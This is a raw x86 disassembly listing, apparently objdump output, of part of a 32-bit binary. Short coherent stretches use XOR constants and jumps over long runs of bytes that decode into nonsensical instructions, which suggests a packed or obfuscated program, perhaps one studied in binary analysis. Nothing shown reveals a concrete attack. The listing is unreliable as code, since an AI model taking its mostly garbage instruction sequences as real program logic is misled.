  41d5a5:	xor    DWORD PTR ds:0x4282f9,0x32fd
  41d5af:	mov    edx,DWORD PTR ds:0x4283e9
  41d5b5:	add    edx,DWORD PTR ds:0x42848d
  41d5bb:	mov    DWORD PTR ds:0x4283e9,edx
  41d5c1:	sub    esi,esi
  41d5c3:	movzx  edx,BYTE PTR ds:0x4282e9
  41d5ca:	add    DWORD PTR ds:0x4284a5,edx
  41d5d0:	mov    DWORD PTR [ebp-0x170],eax
  41d5d6:	mov    DWORD PTR [ebp-0x15c],0xcb79b576
  41d5e0:	mov    DWORD PTR [ebp-0x158],0x9c2b8ae8
  41d5ea:	mov    DWORD PTR [ebp-0x154],0xcb79b572
  41d5f4:	mov    DWORD PTR [ebp-0x150],0x9c2b8ae8
  41d5fe:	mov    esi,DWORD PTR [ebp-0x174]
  41d604:	mov    eax,DWORD PTR [ebp-0x154]
  41d60a:	mov    edx,DWORD PTR [ebp-0x150]
  41d610:	xor    eax,0xcb79b576
  41d615:	xor    edx,0x9c2b8ae8
  41d61b:	mov    cl,0x2
  41d61d:	call   0x408bb8
  41d622:	mov    edi,eax
  41d624:	mov    ebx,edx
  41d626:	mov    eax,DWORD PTR [ebp-0x154]
  41d62c:	jmp    0x41da13
  41d631:	out    dx,al
  41d632:	sbb    DWORD PTR [edi],eax
  41d634:	mov    dh,0x2c
  41d636:	mov    esp,0xfc579970
  41d63b:	bound  ebx,QWORD PTR [esi-0x5b05bfa5]
  41d641:	ja     0x41d694
  41d643:	sar    BYTE PTR [esi-0x41413bb6],0xdf
  41d64a:	repnz mov bh,0x93
  41d64d:	or     BYTE PTR [edi+0x10d1a233],ch
  41d653:	jo     0x41d638
  41d655:	pop    edi
  41d656:	push   ebp
  41d657:	mov    eax,ds:0xbefc80b4
  41d65c:	or     ch,BYTE PTR [ecx]
  41d65e:	dec    ecx
  41d65f:	sub    al,0x6c
  41d661:	mov    eax,ds:0x11a81f51
  41d666:	sahf   
  41d667:	test   eax,0xb4a0a5c
  41d66c:	sub    cl,BYTE PTR [ebx-0x3db60e5e]
  41d672:	test   eax,0xcde84fc4
  41d677:	idiv   BYTE PTR [esp+edi*1]
  41d67a:	or     cl,al
  41d67c:	mov    dl,0x42
  41d67e:	mov    edx,DWORD PTR [eax+0x2a877610]
  41d684:	xor    eax,0xf151d341
  41d689:	mov    ss,WORD PTR [ebx-0xf]
  41d68c:	sub    ecx,eax
  41d68e:	jns    0x41d66e
  41d690:	pop    edi
  41d691:	loop   0x41d67b
  41d693:	inc    edi
  41d694:	ja     0x41d6e0
  41d696:	add    edi,ecx
  41d698:	or     DWORD PTR [eax+0x281b18b4],0x19
  41d69f:	cmp    eax,0xcefb6ea0
  41d6a4:	add    eax,0xe5ccdddf
  41d6a9:	aad    0x24
  41d6ab:	std    
  41d6ac:	add    DWORD PTR [edi],ecx
  41d6ae:	xchg   esp,eax
  41d6af:	enter  0x19,0x63
  41d6b3:	cmc    
  41d6b4:	lahf   
  41d6b5:	shr    DWORD PTR [edi],0x6c
  41d6b8:	shl    DWORD PTR [ebx-0xd],cl
  41d6bb:	aas    
  41d6bc:	jl     0x41d6b8
  41d6be:	mov    dl,0x97
  41d6c0:	leave  
  41d6c1:	or     ah,BYTE PTR [ecx+0x1f]
  41d6c4:	adc    BYTE PTR [edi],ch
  41d6c6:	in     eax,dx
  41d6c7:	dec    edx
  41d6c8:	jo     0x41d68d
  41d6ca:	inc    ebp
  41d6cb:	xchg   esp,eax
  41d6cc:	fneni(8087 only) 
  41d6ce:	sub    ecx,ecx
  41d6d0:	es xor ebp,esp
  41d6d3:	push   edx
  41d6d4:	push   esp
  41d6d5:	or     al,0xfa
  41d6d7:	bound  ebx,QWORD PTR [ecx-0x12]
  41d6da:	inc    esi
  41d6db:	jg     0x41d6dc
  41d6dd:	loop   0x41d6e0
  41d6df:	mov    al,ds:0xfb5350b2
  41d6e4:	call   0x7220:0x99e3ef99
  41d6eb:	jge    0x41d6c2
  41d6ed:	loope  0x41d691
  41d6ef:	or     DWORD PTR [ecx-0x78d3f924],ecx
  41d6f5:	sbb    al,0x6a
  41d6f7:	test   DWORD PTR [ebp+0x66ac536c],ebp
  41d6fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6fe:	push   esi
  41d6ff:	add    BYTE PTR [ebx+eax*2+0x3022e274],bl
  41d706:	cmp    al,0x12
  41d708:	sbb    esp,DWORD PTR [edi+eiz*8+0x5c]
  41d70c:	inc    DWORD PTR [ecx-0x13]
  41d70f:	xor    cl,dl
  41d711:	std    
  41d712:	repz xchg ecx,eax
  41d714:	out    0x62,al
  41d716:	popa   
  41d717:	stos   DWORD PTR es:[edi],eax
  41d718:	mov    edi,0x32809f83
  41d71d:	inc    esp
  41d71e:	xchg   ebp,eax
  41d71f:	ja     0x41d74b
  41d721:	inc    edi
  41d722:	jb     0x41d770
  41d724:	les    esi,FWORD PTR [ebx+0x32]
  41d727:	pop    esi
  41d728:	bound  edx,QWORD PTR [ebx-0x72]
  41d72b:	push   ecx
  41d72c:	dec    edx
  41d72d:	sbb    al,0x9e
  41d72f:	or     esi,DWORD PTR [ecx+eiz*2]
  41d732:	sar    ebx,1
  41d734:	(bad)  
  41d735:	dec    ebx
  41d736:	pop    es
  41d737:	stc    
  41d738:	in     al,0xf5
  41d73a:	add    al,BYTE PTR [esi+0x3322004f]
  41d740:	push   edi
  41d741:	retf   
  41d742:	scas   al,BYTE PTR es:[edi]
  41d743:	jbe    0x41d6eb
  41d745:	hlt    
  41d746:	ins    DWORD PTR es:[edi],dx
  41d747:	adc    ebx,ebp
  41d749:	mov    eax,ds:0x8e53bca6
  41d74e:	mov    edi,0xa82a2285
  41d753:	dec    ebx
  41d754:	enter  0xa638,0x4b
  41d758:	dec    ecx
  41d759:	dec    ebp
  41d75a:	ins    BYTE PTR es:[edi],dx
  41d75b:	adc    DWORD PTR [ebp+0x177b0eb3],edi
  41d761:	fsubr  DWORD PTR [edx-0x2bfa11f5]
  41d767:	scas   al,BYTE PTR es:[edi]
  41d768:	jecxz  0x41d708
  41d76a:	call   0x7bf541ca
  41d76f:	hlt    
  41d770:	lahf   
  41d771:	and    DWORD PTR [esi-0x527be888],ebp
  41d777:	push   es
  41d778:	retf   0xa68
  41d77b:	inc    edi
  41d77c:	cs inc edx
  41d77e:	push   es
  41d77f:	pop    esp
  41d780:	or     DWORD PTR [ecx-0x27],edx
  41d783:	out    0xdb,al
  41d785:	inc    ecx
  41d786:	sbb    DWORD PTR [esi],eax
  41d788:	icebp  
  41d789:	scas   al,BYTE PTR es:[edi]
  41d78a:	cmp    cl,bh
  41d78c:	dec    eax
  41d78d:	push   es
  41d78e:	pop    edx
  41d78f:	push   ebx
  41d790:	rcl    BYTE PTR [ebx-0x38],0xc7
  41d794:	in     eax,0xdb
  41d796:	push   ebx
  41d797:	cmp    eax,0xa25ea4ab
  41d79c:	bound  ebx,QWORD PTR [ecx]
  41d79e:	mov    BYTE PTR [ebp+ebp*4-0x6eb230fe],bl
  41d7a5:	mov    ch,0xf4
  41d7a7:	pop    edx
  41d7a8:	les    esi,FWORD PTR [ebp+ebx*8-0x34]
  41d7ac:	fwait
  41d7ad:	bound  esi,QWORD PTR [ebp+ecx*1-0x79]
  41d7b1:	popf   
  41d7b2:	pushf  
  41d7b3:	push   edi
  41d7b4:	call   0xfc1c41d8
  41d7b9:	(bad)  
  41d7ba:	push   esp
  41d7bb:	fs arpl dx,si
  41d7be:	sub    edi,DWORD PTR [ecx]
  41d7c0:	fld    QWORD PTR [esi+esi*8-0x6c38082]
  41d7c7:	mov    edi,0x8ccf45c9
  41d7cc:	push   es
  41d7cd:	frstor [edx-0x6f]
  41d7d0:	push   0xbda88037
  41d7d5:	fcom   DWORD PTR [edx+0x7a81e6a7]
  41d7db:	pop    edi
  41d7dc:	inc    edx
  41d7dd:	js     0x41d844
  41d7df:	push   ds
  41d7e0:	adc    al,0x7b
  41d7e2:	cli    
  41d7e3:	test   eax,0x6d8a2a9c
  41d7e8:	mov    edx,0x1cbad1b4
  41d7ed:	mov    bl,0x6d
  41d7ef:	scas   al,BYTE PTR es:[edi]
  41d7f0:	out    0x68,eax
  41d7f2:	xor    al,dh
  41d7f4:	inc    sp
  41d7f6:	lock sub eax,DWORD PTR [eax+ecx*8+0x22614434]
  41d7fe:	dec    ebp
  41d7ff:	scas   eax,DWORD PTR es:[edi]
  41d800:	rol    ch,0x54
  41d803:	test   BYTE PTR [edx+eax*4+0x13],dh
  41d807:	(bad)  
  41d808:	outs   dx,DWORD PTR ds:[si]
  41d80a:	mov    al,ds:0x5dabd56
  41d80f:	clc    
  41d810:	out    dx,al
  41d811:	xchg   BYTE PTR [ecx+0x5b],al
  41d814:	daa    
  41d815:	fcom   DWORD PTR [edx]
  41d817:	push   0xffffffaa
  41d819:	or     al,0xc8
  41d81b:	xor    BYTE PTR [ecx-0x6ae45f1d],al
  41d821:	sub    ah,al
  41d823:	jg     0x41d89e
  41d825:	push   eax
  41d826:	or     dl,bl
  41d828:	test   al,0x77
  41d82a:	popa   
  41d82b:	lea    ebp,[ebp-0x58f1c5cc]
  41d831:	mov    eax,0x2ace6ab2
  41d836:	mov    al,0xa4
  41d838:	ins    BYTE PTR es:[edi],dx
  41d839:	or     ah,dh
  41d83b:	lods   eax,DWORD PTR ds:[esi]
  41d83c:	es out 0x40,al
  41d83f:	pushf  
  41d840:	imul   esi,DWORD PTR [edx],0xbbb5d978
  41d846:	push   es
  41d847:	push   eax
  41d848:	push   ebp
  41d849:	sbb    esp,DWORD PTR [ebp+0x54]
  41d84c:	xor    eax,0x6eb84bb
  41d851:	cmp    bl,ch
  41d853:	aam    0x29
  41d855:	cdq    
  41d856:	hlt    
  41d857:	and    BYTE PTR [edx],ch
  41d859:	pop    edi
  41d85a:	or     bh,bl
  41d85c:	hlt    
  41d85d:	dec    eax
  41d85e:	mov    dh,0xfe
  41d860:	ret    0x1e52
  41d863:	pop    es
  41d864:	jge    0x41d8d0
  41d866:	and    al,0x29
  41d868:	aas    
  41d869:	jle    0x41d868
  41d86b:	xchg   esi,ebp
  41d86d:	pop    eax
  41d86e:	jl     0x41d89c
  41d870:	cmp    ch,BYTE PTR [esi+0x4f28664f]
  41d876:	outs   dx,BYTE PTR ds:[esi]
  41d877:	xchg   ebx,eax
  41d878:	(bad)  
  41d879:	(bad)  
  41d87a:	fucomi st,st(7)
  41d87c:	cli    
  41d87d:	ficomp DWORD PTR [esi-0x36]
  41d880:	imul   eax,DWORD PTR [esi+0x75],0x5e
  41d884:	pop    esp
  41d885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d886:	jnp    0x41d8f9
  41d888:	dec    ebp
  41d889:	jg     0x41d8a4
  41d88b:	dec    ebx
  41d88c:	push   es
  41d88d:	ss ja  0x41d8b9
  41d890:	das    
  41d891:	sbb    DWORD PTR [edx],esp
  41d893:	sbb    eax,0x427cf388
  41d898:	aam    0x40
  41d89a:	rcr    BYTE PTR [ecx],1
  41d89c:	add    DWORD PTR [esi-0x70],ebx
  41d89f:	dec    edi
  41d8a0:	sbb    BYTE PTR [edx-0x15],0x36
  41d8a4:	mov    eax,0xedb81aa2
  41d8a9:	scas   eax,DWORD PTR es:[edi]
  41d8aa:	lea    edi,[edi]
  41d8ac:	jo     0x41d846
  41d8ae:	rol    eax,cl
  41d8b0:	or     ch,ah
  41d8b2:	adc    eax,0xd5097007
  41d8b7:	add    eax,0xc402b51
  41d8bc:	sub    DWORD PTR [eax+eiz*2-0x59f7d38a],esi
  41d8c3:	push   esi
  41d8c4:	add    bl,bh
  41d8c6:	arpl   WORD PTR [edi-0x478041c],sp
  41d8cc:	push   ebx
  41d8cd:	clc    
  41d8ce:	cld    
  41d8cf:	mov    cl,0x8b
  41d8d1:	jmp    0xabc15e53
  41d8d6:	jecxz  0x41d88b
  41d8d8:	popf   
  41d8d9:	int3   
  41d8da:	sbb    BYTE PTR [ebp+esi*4-0x14],ch
  41d8de:	push   ds
  41d8df:	add    dh,BYTE PTR [edi+0x681a2a49]
  41d8e5:	cdq    
  41d8e6:	retf   
  41d8e7:	push   edx
  41d8e8:	cld    
  41d8e9:	popa   
  41d8ea:	ret    
  41d8eb:	cdq    
  41d8ec:	push   es
  41d8ed:	and    al,0x9b
  41d8ef:	or     eax,0xf85bb3ae
  41d8f4:	xchg   ebx,eax
  41d8f5:	xchg   ebp,eax
  41d8f6:	ret    0xeecf
  41d8f9:	fsub   QWORD PTR [esi]
  41d8fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8fc:	pop    eax
  41d8fd:	cmc    
  41d8fe:	(bad)  
  41d8ff:	mov    ch,0x6d
  41d901:	cmp    BYTE PTR [bp+di+0x74e0],cl
  41d906:	call   0x5635:0x162f6b59
  41d90d:	imul   eax,DWORD PTR [ebp+0x12972ef1],0xffffffeb
  41d914:	mov    dh,0xde
  41d916:	and    DWORD PTR [ebx+edx*1+0xed3b95],eax
  41d91d:	sahf   
  41d91e:	stos   BYTE PTR es:[edi],al
  41d91f:	add    edx,ecx
  41d921:	and    ebx,ebp
  41d923:	push   0x1035a1f7
  41d928:	mov    esp,0xb393d328
  41d92d:	push   esp
  41d92e:	scas   al,BYTE PTR es:[edi]
  41d92f:	ret    
  41d930:	or     esp,DWORD PTR [ebx-0x13]
  41d933:	xor    eax,0x31e6af97
  41d938:	adc    BYTE PTR [eax-0x15],ch
  41d93b:	dec    ecx
  41d93c:	pop    ebx
  41d93d:	sar    BYTE PTR [ebp+0x59],0x29
  41d941:	xchg   BYTE PTR [edx+0x13017a6a],bh
  41d947:	outs   dx,DWORD PTR ds:[esi]
  41d948:	(bad)  
  41d949:	pop    ds
  41d94a:	outs   dx,DWORD PTR ds:[esi]
  41d94b:	into   
  41d94c:	jns    0x41d8ef
  41d94e:	enter  0x328b,0xb1
  41d952:	das    
  41d953:	sbb    al,0x7
  41d955:	fcmovb st,st(4)
  41d957:	out    0x1c,al
  41d959:	mov    ch,0xec
  41d95b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d95c:	test   ah,dh
  41d95e:	push   es
  41d95f:	push   cs
  41d960:	(bad)  
  41d961:	les    ebx,FWORD PTR [ebx]
  41d963:	repnz pop es
  41d965:	or     al,0xd2
  41d967:	test   DWORD PTR [esi],edx
  41d969:	cmp    ch,al
  41d96b:	retf   0x38f1
  41d96e:	outs   dx,BYTE PTR ds:[esi]
  41d96f:	vpmadcsswd ymm15,ymm5,YMMWORD PTR [ebp+0x14],ymm1
  41d976:	inc    esi
  41d977:	sbb    BYTE PTR [ecx-0xb],cl
  41d97a:	(bad)  
  41d97b:	imul   esp,ebx,0xffffffe5
  41d97e:	int3   
  41d97f:	push   ds
  41d980:	jno    0x41d9dd
  41d982:	(bad)  
  41d983:	mov    ebp,0x5814d152
  41d988:	iret   
  41d989:	push   edx
  41d98b:	scas   al,BYTE PTR es:[edi]
  41d98c:	or     BYTE PTR [ecx+0xe9ee978],0x2d
  41d993:	xor    DWORD PTR [edi-0x30b34be9],edi
  41d999:	xchg   BYTE PTR [eax+0xb3d245a],dh
  41d99f:	mov    bl,0x8d
  41d9a1:	and    al,0x1b
  41d9a3:	mov    edx,0xd2e13f03
  41d9a8:	dec    eax
  41d9a9:	js     0x41d970
  41d9ab:	mov    ch,0x96
  41d9ad:	imul   esi,DWORD PTR [ebx],0xffffffcb
  41d9b0:	retf   0x28ab
  41d9b3:	jge    0x41d99f
  41d9b5:	inc    esp
  41d9b6:	push   0xfb625f64
  41d9bb:	loop   0x41da30
  41d9bd:	sbb    eax,0xd9ad14e8
  41d9c2:	retf   0x5bcd
  41d9c5:	push   0xffffffa4
  41d9c7:	retf   0xeab9
  41d9ca:	jno    0x41da3a
  41d9cc:	jmp    0xa56b:0xcbf5e7c2
  41d9d3:	gs pop ecx
  41d9d5:	xor    DWORD PTR [eax],esp
  41d9d7:	adc    DWORD PTR [ebp+0x54],esp
  41d9da:	jns    0x41d9b0
  41d9dc:	jp     0x41d9c8
  41d9de:	jae    0x41da52
  41d9e0:	inc    ecx
  41d9e1:	pop    edx
  41d9e2:	int3   
  41d9e3:	scas   al,BYTE PTR es:[edi]
  41d9e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9e5:	es dec ecx
  41d9e7:	cdq    
  41d9e8:	mov    edi,0xeae8e3e3
  41d9ed:	lods   eax,DWORD PTR ds:[esi]
  41d9ee:	mov    edx,0x89a33675
  41d9f3:	lods   eax,DWORD PTR ds:[esi]
  41d9f4:	cmp    al,BYTE PTR [ecx]
  41d9f6:	imul   esi
  41d9f8:	adc    eax,0x5e1573fc
  41d9fd:	bswap  sp
  41da00:	stos   BYTE PTR es:[edi],al
  41da01:	push   es
  41da02:	xchg   ebp,eax
  41da03:	pop    ss
  41da04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da05:	cdq    
  41da06:	push   DWORD PTR [edx+ecx*1+0x58]
  41da0a:	jnp    0x41da11
  41da0c:	(bad)  
  41da0d:	pop    eax
  41da0e:	daa    
  41da0f:	lods   eax,DWORD PTR ds:[esi]
  41da10:	jnp    0x41da77
  41da12:	mov    edx,DWORD PTR gs:[ebp-0x150]
  41da19:	xor    eax,0xcb79b576
  41da1e:	xor    edx,0x9c2b8ae8
  41da24:	mov    cl,0x3e
  41da26:	call   0x4223ad
  41da2b:	or     edi,eax
  41da2d:	or     ebx,edx
  41da2f:	mov    eax,DWORD PTR [ebp-0x15c]
  41da35:	mov    edx,DWORD PTR [ebp-0x158]
  41da3b:	jmp    0x41de22
  41da40:	outs   dx,BYTE PTR ds:[esi]
  41da41:	cdq    
  41da42:	bound  ebp,QWORD PTR fs:[esp+edi*4+0x63179970]
  41da4a:	xor    bl,ch
  41da4c:	mov    ds:0x3e3ebe0,al
  41da51:	pop    ecx
  41da52:	sar    BYTE PTR [esi-0x41413bb6],0x85
  41da59:	outs   dx,BYTE PTR ds:[esi]
  41da5a:	jno    0x41d9f0
  41da5c:	pop    ss
  41da5d:	jge    0x41da98
  41da5f:	ss mov bh,0xcb
  41da62:	pop    es
  41da63:	es pop es
  41da65:	rol    DWORD PTR [esi+0x25],cl
  41da68:	inc    edi
  41da69:	dec    ebp
  41da6a:	xchg   ebp,eax
  41da6b:	dec    edi
  41da6c:	lock popf 
  41da6e:	pop    esi
  41da6f:	jle    0x41dac8
  41da71:	es aaa 
  41da73:	ja     0x41da43
  41da75:	jg     0x41da45
  41da77:	data16 daa 
  41da79:	(bad)  
  41da7a:	pop    ds
  41da7b:	retf   
  41da7c:	inc    esp
  41da7d:	dec    esp
  41da7e:	mov    eax,0x81afc204
  41da83:	js     0x41dad3
  41da85:	aad    0x76
  41da87:	pop    esi
  41da88:	sahf   
  41da89:	loop   0x41da45
  41da8b:	jge    0x41da11
  41da8d:	mov    esi,0x30468dfb
  41da92:	retf   
  41da93:	inc    edi
  41da94:	adc    al,BYTE PTR [edi-0xe651538]
  41da9a:	lock sub esi,edx
  41da9d:	in     al,dx
  41da9e:	sub    cl,BYTE PTR [ebp-0x32]
  41daa1:	pusha  
  41daa2:	adc    eax,0xfe71f789
  41daa7:	lock fsubr QWORD PTR [edx+0x25c09ce4]
  41daae:	and    eax,0x6a99002b
  41dab3:	xor    edx,esi
  41dab5:	fdivr  QWORD PTR [ebx-0x19e66554]
  41dabb:	test   eax,0x12c3eaec
  41dac0:	adc    DWORD PTR [esi+0x9f03af2],0x1e
  41dac7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dac8:	sbb    dl,al
  41daca:	bound  eax,QWORD PTR [ebx]
  41dacc:	pop    esi
  41dacd:	int3   
  41dace:	pop    ss
  41dacf:	popa   
  41dad0:	mov    ds:0xba74f04b,eax
  41dad5:	pop    eax
  41dad6:	in     al,dx
  41dad7:	(bad)  
  41dad8:	lock inc esi
  41dada:	cmc    
  41dadb:	or     al,0x5d
  41dadd:	jo     0x41daf9
  41dadf:	aas    
  41dae0:	mov    esi,0x245b5a0e
  41dae5:	pop    ecx
  41dae6:	pop    eax
  41dae7:	adc    DWORD PTR [edx],0xd73e3524
  41daed:	(bad)  
  41daee:	xchg   ecx,eax
  41daef:	mov    bl,BYTE PTR [edx+0x3014abf5]
  41daf5:	sar    ebp,1
  41daf7:	jge    0x41db2e
  41daf9:	xchg   edx,eax
  41dafa:	fs inc ebx
  41dafc:	mov    ds,WORD PTR ds:0x10297172
  41db02:	mov    esp,0x30968b32
  41db07:	add    BYTE PTR [esi+0x5d0bb6d1],bl
  41db0d:	jbe    0x41db3e
  41db0f:	mov    ecx,0x90503839
  41db14:	test   al,0xf4
  41db16:	rol    BYTE PTR [ebx-0x7b32df86],0x23
  41db1d:	rol    DWORD PTR ss:[edx-0x5b65075d],1
  41db24:	shl    BYTE PTR [edi-0x69],0xea
  41db28:	mov    cl,0xe6
  41db2a:	loopne 0x41daf2
  41db2c:	test   DWORD PTR [ecx],eax
  41db2e:	jl     0x41db56
  41db30:	dec    ebp
  41db31:	jno    0x41db29
  41db33:	nop
  41db34:	mov    ecx,ebx
  41db36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db37:	inc    ebx
  41db38:	dec    ebx
  41db39:	repz dec ecx
  41db3b:	test   al,0xbe
  41db3d:	cmc    
  41db3e:	es call 0xc473:0x1ea90d0e
  41db46:	dec    ebx
  41db47:	sub    eax,0xa20dc162
  41db4c:	cmp    al,cl
  41db4e:	push   edx
  41db4f:	call   0x2954:0x169d5622
  41db56:	fwait
  41db57:	bswap  esi
  41db59:	xchg   ah,bl
  41db5b:	je     0x41dbcb
  41db5d:	fisub  WORD PTR [edx+0xa]
  41db60:	or     bl,ah
  41db62:	cdq    
  41db63:	sub    edi,DWORD PTR [ebx-0x11]
  41db66:	pop    edi
  41db67:	xor    eax,0xa1595f91
  41db6c:	xchg   esi,eax
  41db6d:	test   eax,0xc99c72dc
  41db72:	xor    al,0x6f
  41db74:	xor    WORD PTR [eax+0xffc9be7],dx
  41db7b:	adc    al,0x97
  41db7d:	mov    ecx,DWORD PTR [edx+0x78ab510d]
  41db83:	test   al,0xe9
  41db85:	ficomp WORD PTR [ebp-0x31]
  41db88:	add    ch,cl
  41db8a:	popf   
  41db8b:	pop    edx
  41db8c:	mov    ebx,DWORD PTR [ebx-0x4e44c9f8]
  41db92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db94:	jb     0x41db21
  41db96:	in     al,dx
  41db97:	jb     0x41db24
  41db99:	xchg   esp,eax
  41db9a:	dec    esp
  41db9b:	adc    edi,DWORD PTR [ebp+0x5a]
  41db9e:	repz (bad) 
  41dba0:	or     BYTE PTR ss:[ebx-0x45],al
  41dba4:	push   esp
  41dba5:	inc    esp
  41dba6:	int    0x30
  41dba8:	inc    ebp
  41dba9:	pop    ds
  41dbaa:	in     eax,0x43
  41dbac:	pop    edx
  41dbad:	dec    esi
  41dbae:	jne    0x41dc1d
  41dbb0:	cmp    ch,BYTE PTR [eax-0x34]
  41dbb3:	push   ebx
  41dbb4:	jecxz  0x41db5d
  41dbb6:	test   al,0x89
  41dbb8:	idiv   BYTE PTR [eax+ebx*2-0x41]
  41dbbc:	sub    ch,BYTE PTR [ebx]
  41dbbe:	add    ecx,0x4d7f8e69
  41dbc4:	das    
  41dbc5:	mov    eax,0x5874fac0
  41dbca:	jmp    0x41db65
  41dbcc:	popf   
  41dbcd:	mov    bl,0x31
  41dbcf:	mov    eax,0xd2598f51
  41dbd4:	jns    0x41dbe7
  41dbd6:	dec    edx
  41dbd7:	nop
  41dbd8:	fistp  QWORD PTR [edi+0x5110bfcd]
  41dbde:	mov    bh,0xad
  41dbe0:	cwde   
  41dbe1:	stc    
  41dbe2:	inc    ebx
  41dbe3:	test   WORD PTR [eax-0x80],bx
  41dbe7:	push   es
  41dbe8:	dec    esi
  41dbe9:	clc    
  41dbea:	sbb    edi,DWORD PTR [esi+0x15]
  41dbed:	cdq    
  41dbee:	or     eax,0x2fff59ed
  41dbf3:	sub    DWORD PTR [eax+0x692238e5],ecx
  41dbf9:	ds imul edi,esp,0x223c74c6
  41dc00:	dec    edx
  41dc01:	test   eax,0xb1f29331
  41dc06:	push   eax
  41dc07:	or     eax,0xbad745d5
  41dc0c:	jg     0xa0b6c273
  41dc12:	or     BYTE PTR cs:[ebx-0x1c5b7aee],bl
  41dc19:	xlat   BYTE PTR ds:[ebx]
  41dc1a:	adc    BYTE PTR [edx-0x3e7d33b2],bl
  41dc20:	cmp    BYTE PTR [esi],ah
  41dc22:	mov    eax,0xa3283615
  41dc27:	xor    bh,BYTE PTR [ebp-0x13]
  41dc2a:	sbb    BYTE PTR [ecx],cl
  41dc2c:	xchg   ebx,eax
  41dc2d:	jmp    0x340:0x89a1107e
  41dc34:	xor    bl,dl
  41dc36:	and    cl,BYTE PTR [esi]
  41dc38:	mov    al,ds:0x8bbbcd75
  41dc3d:	mov    esp,0xb993994c
  41dc42:	retf   
  41dc43:	inc    eax
  41dc44:	rcl    BYTE PTR [edi+0x5b],0xc
  41dc48:	aas    
  41dc49:	adc    al,0x43
  41dc4b:	shr    edx,1
  41dc4d:	xchg   edi,eax
  41dc4e:	ret    
  41dc4f:	leave  
  41dc50:	enter  0x39f1,0xae
  41dc54:	pushf  
  41dc55:	and    BYTE PTR [edi-0x7d],cl
  41dc58:	in     al,0x91
  41dc5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc5b:	inc    edx
  41dc5c:	inc    ebx
  41dc5d:	xor    al,0xe5
  41dc5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc60:	inc    esp
  41dc61:	in     al,0x41
  41dc63:	mov    ds:0x8f67d618,al
  41dc68:	adc    BYTE PTR [ecx-0x7e74a48],bl
  41dc6e:	pop    si
  41dc70:	je     0x41dc20
  41dc72:	nop
  41dc73:	or     dh,BYTE PTR [ebp+0x66]
  41dc76:	sahf   
  41dc77:	test   DWORD PTR [ebx+0x5a],ecx
  41dc7a:	adc    ah,BYTE PTR [ebp-0x26a4c556]
  41dc80:	sti    
  41dc81:	retf   0x689
  41dc84:	stc    
  41dc85:	popf   
  41dc86:	ss ins BYTE PTR es:[edi],dx
  41dc88:	sub    al,0x60
  41dc8a:	ret    0xad85
  41dc8d:	call   0xb81746ba
  41dc92:	loope  0x41dc5b
  41dc94:	sub    BYTE PTR [eax+ebp*1+0x274fa6d1],ch
  41dc9b:	(bad)  
  41dc9c:	push   esp
  41dc9d:	retf   
  41dc9e:	push   edx
  41dc9f:	clc    
  41dca0:	sub    eax,0x69a9f414
  41dca5:	mov    eax,DWORD PTR [edx+ecx*8-0x42]
  41dca9:	mov    esi,0xc11d82ac
  41dcaf:	repnz push ss
  41dcb1:	icebp  
  41dcb2:	(bad)  
  41dcb3:	mov    WORD PTR [esi+0x3e36f781],ds
  41dcb9:	mov    dh,0x87
  41dcbb:	rcr    BYTE PTR [edi-0x31],cl
  41dcbe:	mov    ds:0xd86d7789,eax
  41dcc3:	adc    edi,DWORD PTR [eax+0x68]
  41dcc6:	loop   0x41dccc
  41dcc8:	mov    ebx,0x20caeb19
  41dccd:	fwait
  41dcce:	mov    edi,0xfb1abc25
  41dcd3:	sbb    DWORD PTR [ebx-0x44332808],ecx
  41dcd9:	lods   eax,DWORD PTR ds:[esi]
  41dcda:	dec    ecx
  41dcdb:	popa   
  41dcdc:	fld    DWORD PTR [edx+eiz*4-0x48]
  41dce0:	rcr    BYTE PTR [edi+0x39],cl
  41dce3:	ja     0x41dc9f
  41dce5:	mov    edi,0xe2f6087
  41dcea:	lea    esi,[eax]
  41dcec:	jge    0x41dc71
  41dcee:	jl     0x41dc79
  41dcf0:	pop    ebx
  41dcf1:	inc    eax
  41dcf2:	repz pushf 
  41dcf4:	add    DWORD PTR [ebp+0x2ee3fd47],ecx
  41dcfa:	sub    ch,bh
  41dcfc:	sar    al,cl
  41dcfe:	imul   edx,DWORD PTR [edi],0xffffffa3
  41dd01:	sub    DWORD PTR [edi],0xfffffffe
  41dd04:	push   ebp
  41dd05:	push   ds
  41dd06:	in     eax,dx
  41dd07:	sahf   
  41dd08:	aas    
  41dd09:	push   edx
  41dd0a:	mov    eax,0xfcb5b5fe
  41dd0f:	out    0x3e,al
  41dd11:	loope  0x41dd33
  41dd13:	adc    DWORD PTR [ebx],esi
  41dd15:	push   edx
  41dd16:	pop    edi
  41dd17:	mov    BYTE PTR [edx-0x6c],0xc4
  41dd1b:	cli    
  41dd1c:	sub    bl,BYTE PTR [ebx-0x3e]
  41dd1f:	test   al,0x52
  41dd21:	jl     0x41dd07
  41dd23:	push   eax
  41dd24:	std    
  41dd25:	shl    DWORD PTR [ebx+edi*2+0x3d],0x17
  41dd2a:	adc    BYTE PTR [ecx+0x79],ch
  41dd2d:	mov    ds:0x478404c2,eax
  41dd32:	(bad)  
  41dd34:	iret   
  41dd35:	cmp    BYTE PTR [ecx],0x7d
  41dd38:	jle    0x41dda6
  41dd3a:	outs   dx,DWORD PTR ds:[esi]
  41dd3b:	push   ds
  41dd3c:	(bad)  
  41dd3d:	cmp    DWORD PTR [ebx+ebp*8],esp
  41dd40:	push   es
  41dd41:	xor    ah,al
  41dd43:	jns    0x41dd95
  41dd45:	bt     DWORD PTR [esi-0x6085f80e],ebp
  41dd4c:	jmp    0x41dd9b
  41dd4e:	loop   0x41dd0d
  41dd50:	aaa    
  41dd51:	cs data16 mov al,0x1c
  41dd55:	mov    eax,0x791c6a7d
  41dd5a:	push   0x38
  41dd5c:	xchg   edx,edx
  41dd5e:	dec    ebp
  41dd5f:	imul   BYTE PTR [esi+0x34]
